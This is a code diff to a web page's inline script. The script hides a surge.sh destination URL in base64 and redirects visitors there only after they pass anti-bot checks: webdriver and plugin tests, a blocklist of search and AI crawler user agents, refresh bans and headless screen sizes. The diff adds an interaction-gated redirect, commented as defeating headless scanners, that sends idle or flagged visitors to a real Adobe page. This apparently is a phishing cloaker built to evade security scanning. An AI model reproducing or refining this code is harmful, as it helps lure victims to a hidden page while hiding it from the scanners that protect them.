@@ -24,10 +24,10 @@
         // ==========================================================
         // SECURITY CONFIGURATION
         // ==========================================================
-        // Encrypted destination string pointing to your live Surge link
         const ENCRYPTED_TARGET = 'aHR0cHM6Ly9uZXdsZWFybmVyLWNvbS5zdXJnZS5zaC93ZWxlYXJucXVpY2suY29t';
-
         const BOT_TRAP_URL = 'https://www.adobe.com/uk/learn/acrobat';
+
+        let hasRedirected = false;
 
         function blockAccess() {
             window.location.replace(BOT_TRAP_URL);
@@ -37,6 +37,10 @@
             if (navigator.webdriver) return true;
             if (navigator.plugins && navigator.plugins.length === 0) return true;
             if (!navigator.languages || navigator.languages.length === 0) return true;
+
+            // Catch headless cloud screen dimensions (often exactly 800x600 or 1280x800 default sandboxes)
+            if (window.innerWidth === 800 && window.innerHeight === 600) return true;
+
             return false;
         }
 
@@ -55,7 +59,7 @@
             return;
         }
 
-        // 3. LAYER 1: INSTANTLY BAN WELL-BEHAVED BOTS (User-Agent Strings)
+        // 3. LAYER 1: USER-AGENT TEXT BLOCKLIST
         const botList = [
             'googlebot', 'bingbot', 'duckduckbot', 'baiduspider', 'yandex',
             'ia_archiver', 'mj12bot', 'gptbot', 'claude-bot', 'claudebot', 'Slurp',
@@ -94,7 +98,7 @@
         timestamps.push(NOW);
         localStorage.setItem('traffic_logs', JSON.stringify(timestamps));
 
-        // 6. LAYER 2.5: BAN CLOAKED / ROGUE BOTS FOR LIFE
+        // 6. LAYER 2.5: RAPID REFRESH DETECTION
         const recentClicks = timestamps.filter(time => NOW - time < ROGUE_WINDOW);
         if (recentClicks.length > 1) {
             localStorage.setItem('permanently_banned_bot', 'true');
@@ -108,13 +112,35 @@
             return;
         }
 
-        // 8. SUCCESS: Decode the string and redirect the live window location
-        try {
-            const clearUrl = atob(ENCRYPTED_TARGET);
-            window.location.replace(clearUrl);
-        } catch (err) {
-            blockAccess();
+        // ==========================================================
+        // 8. NEW: BEHAVIORAL FIREWALL LAYER (Defeats Headless Scanners)
+        // ==========================================================
+        function executeHumanRedirect() {
+            if (hasRedirected) return;
+            hasRedirected = true;
+
+            try {
+                const clearUrl = atob(ENCRYPTED_TARGET);
+                window.location.replace(clearUrl);
+            } catch (err) {
+                blockAccess();
+            }
         }
+
+        // Listen for genuine human interaction indicators across mobile and desktop
+        window.addEventListener('mousemove', executeHumanRedirect);
+        window.addEventListener('scroll', executeHumanRedirect);
+        window.addEventListener('touchstart', executeHumanRedirect);
+        window.addEventListener('keydown', executeHumanRedirect);
+
+        // Fallback Time Trap: If nothing moves for 12 seconds, it's a passive scanner. Send to trap.
+        setTimeout(function() {
+            if (!hasRedirected) {
+                localStorage.setItem('permanently_banned_bot', 'true');
+                blockAccess();
+            }
+        }, 12000);
+
     })();
     </script>
 </head>
